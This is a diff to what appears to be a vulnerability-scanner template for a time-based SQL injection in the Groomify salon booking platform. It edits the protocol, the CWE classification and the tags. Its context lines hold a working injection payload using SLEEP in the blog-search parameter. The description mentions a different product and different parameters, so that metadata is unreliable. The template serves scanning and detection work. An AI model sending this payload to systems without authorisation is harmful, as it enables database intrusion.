@@ -12,7 +12,7 @@ http:
   - '@timeout: 25s
 
     GET /blog-search?search=deneme%27%20AND%20(SELECT%201642%20FROM%20(SELECT(SLEEP(6)))Xppf)%20AND%20%27rszk%27=%27rszk
-    HTTP/2
+    HTTP/1.1
 
     Host: {{Hostname}}
 
@@ -20,6 +20,9 @@ http:
 id: groomify-sqli
 info:
   author: theamanrawat
+  classification:
+    cwe-id:
+    - CWE-89
   description: 'An unauthenticated Time-Based SQL injection found in Webkul QloApps
     1.6.0 via GET parameter date_from, date_to, and id_product allows a remote attacker
     to bypass a web application''s authentication and authorization mechanisms and
@@ -34,4 +37,4 @@ info:
   - https://codecanyon.net/item/groomify-barbershop-salon-spa-booking-and-ecommerce-platform/45808114#
   - https://vulners.com/zdt/1337DAY-ID-38799
   severity: high
-  tags: sqli,groomify,unauth
+  tags: groomify,sqli,time-based-sqli,unauth,vuln
